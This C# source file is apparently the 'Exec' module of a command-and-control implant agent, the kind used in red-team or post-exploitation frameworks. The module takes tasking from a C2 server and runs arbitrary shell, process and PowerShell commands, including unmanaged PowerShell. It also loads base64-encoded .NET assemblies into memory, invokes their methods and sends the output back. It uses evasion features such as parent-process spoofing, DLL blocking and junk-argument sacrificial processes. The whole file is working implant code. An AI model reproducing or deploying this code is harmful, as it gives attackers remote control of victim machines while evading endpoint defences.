using Agent.Controllers;
using Agent.Interfaces;
using Agent.Models;
using Agent.Utilities;

using Shared.Models;

using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Text;

namespace Agent.Modules
{
    public class ExecModule : IAgentModule
    {
        AgentController Agent;
        ConfigController Config;

        Assembly CurrentAssembly;
        byte[] CurrentPowerShell;

        public void Init(AgentController Agent, ConfigController Config)
        {
            this.Agent = Agent;
            this.Config = Config;
        }

        public ModuleInfo GetModuleInfo()
        {
            return new ModuleInfo
            {
                Name = "Exec",
                Commands = new List<ModuleInfo.Command>
                {
                    new ModuleInfo.Command
                    {
                        Name = "Shell",
                        Delegate = ExecuteShellCommand
                    },
                    new ModuleInfo.Command
                    {
                        Name = "Run",
                        Delegate = ExecuteRunCommand
                    },
                    new ModuleInfo.Command
                    {
                        Name = "PowerShell",
                        Delegate = ExecutePowerShellCommand
                    },
                    new ModuleInfo.Command
                    {
                        Name = "PowerPick",
                        Delegate = ExecutePowerPickCommand
                    },
                    new ModuleInfo.Command
                    {
                        Name = "ImportPowerShell",
                        Delegate = ImportPowerShell
                    },
                    new ModuleInfo.Command
                    {
                        Name = "Assembly",
                        Delegate = ExecuteAssembly
                    },
                    new ModuleInfo.Command
                    {
                        Name = "ImportAssembly",
                        Delegate = ImportAssembly
                    },
                    new ModuleInfo.Command
                    {
                        Name = "AssemblyMethod",
                        Delegate = ExecuteAssemblyMethod
                    }
                }
            };
        }

        void ExecuteShellCommand(string AgentID, C2Data C2Data)
        {
            try
            {
                var ppid = Config.Get<int>(AgentConfig.PPID);
                var blockdlls = Config.Get<bool>(AgentConfig.BlockDLLs);

                var parameters = Shared.Utilities.Utilities.DeserialiseData<AgentTask>(C2Data.Data).Parameters;
                var arguments = (string)parameters.FirstOrDefault(p => p.Name.Equals("Arguments", StringComparison.OrdinalIgnoreCase)).Value;

                var lamb = new SacrificialLamb(ppid, blockdlls);
                var result = lamb.Shell("klasdjflasdkjflsadjflsadjflskdajflsjdfljdslfjsdlafjlsjdflsjadflsjdlfkj", $"/c {arguments}");

                Agent.SendMessage(result);
            }
            catch (Exception e)
            {
                Agent.SendError(e.Message);
            }
        }

        void ExecuteRunCommand(string AgentID, C2Data C2Data)
        {
            try
            {
                var ppid = Config.Get<int>(AgentConfig.PPID);
                var blockdlls = Config.Get<bool>(AgentConfig.BlockDLLs);

                var parameters = Shared.Utilities.Utilities.DeserialiseData<TaskParameters>(C2Data.Data).Parameters;

                var command = (string)parameters.FirstOrDefault(p => p.Name.Equals("Command", StringComparison.OrdinalIgnoreCase)).Value;
                var arguments = parameters.FirstOrDefault(p => p.Name.Equals("Arguments", StringComparison.OrdinalIgnoreCase)).Value;

                if (arguments == null)
                {
                    arguments = string.Empty;
                }

                var lamb = new SacrificialLamb(ppid, blockdlls);
                var result = lamb.Run(command, "lskdajflaksdjflasjdflkjadslkfjlaksdjfljdsalfjdlsakjfljasdlfj", (string)arguments);

                Agent.SendMessage(result);
            }
            catch (Exception e)
            {
                Agent.SendError(e.Message);
            }
        }

        void ExecutePowerShellCommand(string AgentID, C2Data C2Data)
        {
            try
            {
                var ppid = Config.Get<int>(AgentConfig.PPID);
                var blockdlls = Config.Get<bool>(AgentConfig.BlockDLLs);

                var parameters = Shared.Utilities.Utilities.DeserialiseData<TaskParameters>(C2Data.Data).Parameters;
                var arguments = (string)parameters.FirstOrDefault(p => p.Name.Equals("Arguments", StringComparison.OrdinalIgnoreCase)).Value;

                var lamb = new SacrificialLamb(ppid, blockdlls);
                var result = lamb.PowerShell("klasdjflasdkjflsadjflsadjflskdajflsjdfljdslfjsdlafjlsjdflsjadflsjdlfkj", $"-c \"{arguments}\"");

                Agent.SendMessage(result);
            }
            catch (Exception e)
            {
                Agent.SendError(e.Message);
            }
        }

        void ExecutePowerPickCommand(string AgentID, C2Data C2Data)
        {
            try
            {
                var parameters = Shared.Utilities.Utilities.DeserialiseData<TaskParameters>(C2Data.Data).Parameters;
                var arguments = (string)parameters.FirstOrDefault(p => p.Name.Equals("Arguments", StringComparison.OrdinalIgnoreCase)).Value;

                using (var runner = new PowerShellRunner())
                {
                    if (CurrentPowerShell.Length > 0)
                    {
                        runner.ImportScript(Encoding.UTF8.GetString(CurrentPowerShell));
                    }

                    var result = runner.InvokePS(arguments);
                    Agent.SendMessage(result);
                }
            }
            catch (Exception e)
            {
                Agent.SendError(e.Message);
            }
        }

        void ExecuteAssembly(string AgentID, C2Data C2Data)
        {
            var stdout = Console.Out;
            var stderr = Console.Error;

            try
            {
                var parameters = Shared.Utilities.Utilities.DeserialiseData<TaskParameters>(C2Data.Data).Parameters;

                var arguments = parameters.FirstOrDefault(p => p.Name.Equals("Arguments", StringComparison.OrdinalIgnoreCase)).Value;
                var asmBytes = Convert.FromBase64String((string)parameters.FirstOrDefault(p => p.Name.Equals("Assembly", StringComparison.OrdinalIgnoreCase)).Value);

                var outWrite = new StringWriter();
                var errWrite = new StringWriter();

                Console.SetOut(outWrite);
                Console.SetError(errWrite);

                var asm = Assembly.Load(asmBytes);

                if (arguments == null)
                {
                    arguments = new string[] { };
                }
                else
                {
                    arguments = new string[] { arguments as string };
                }

                asm.EntryPoint.Invoke(null, new object[] { arguments });

                Console.Out.Flush();
                Console.Error.Flush();

                var result = new StringBuilder();
                result.Append(outWrite.ToString());
                result.Append(errWrite.ToString());

                Agent.SendMessage(result.ToString());
            }
            catch (Exception e)
            {
                Agent.SendError(e.Message);
            }
            finally
            {
                Console.SetOut(stdout);
                Console.SetError(stderr);
            }
        }

        void ImportAssembly(string AgentID, C2Data C2Data)
        {
            try
            {
                var parameters = Shared.Utilities.Utilities.DeserialiseData<TaskParameters>(C2Data.Data).Parameters;
                var asmBytes = Convert.FromBase64String((string)parameters.FirstOrDefault(p => p.Name.Equals("Assembly", StringComparison.OrdinalIgnoreCase)).Value);

                CurrentAssembly = Assembly.Load(asmBytes);

                Agent.SendMessage($"Assembly loaded: {CurrentAssembly.FullName}");
            }
            catch (Exception e)
            {
                Agent.SendError(e.Message);
            }
            
        }

        void ImportPowerShell(string AgentID, C2Data C2Data)
        {
            var parameters = Shared.Utilities.Utilities.DeserialiseData<TaskParameters>(C2Data.Data).Parameters;
            CurrentPowerShell = Convert.FromBase64String((string)parameters.FirstOrDefault(p => p.Name.Equals("Script", StringComparison.OrdinalIgnoreCase)).Value);

            Agent.SendMessage($"Imported {CurrentPowerShell.Length} bytes.");
        }

        void ExecuteAssemblyMethod(string AgentID, C2Data C2Data)
        {
            try
            {
                var parameters = Shared.Utilities.Utilities.DeserialiseData<TaskParameters>(C2Data.Data).Parameters;

                var type = (string)parameters.FirstOrDefault(p => p.Name.Equals("Type", StringComparison.OrdinalIgnoreCase)).Value;
                var method = (string)parameters.FirstOrDefault(p => p.Name.Equals("Method", StringComparison.OrdinalIgnoreCase)).Value;
                var arguments = parameters.FirstOrDefault(p => p.Name.Equals("Arguments", StringComparison.OrdinalIgnoreCase)).Value;

                var t = CurrentAssembly.GetType(type);

                if (t == null)
                {
                    Agent.SendError("Could not find specified type");
                    return;
                }

                var m = t.GetMethod(method);

                if (m == null)
                {
                    Agent.SendError("Could not find specified method");
                    return;
                }

                string result;

                if (arguments == null)
                {
                    result = (string)m.Invoke(null, new object[] { });
                }
                else
                {
                    result = (string)m.Invoke(null, new object[] { (string)arguments });
                }

                Agent.SendMessage(result.ToString());
            }
            catch (Exception e)
            {
                Agent.SendError(e.Message);
            }
        }
    }
}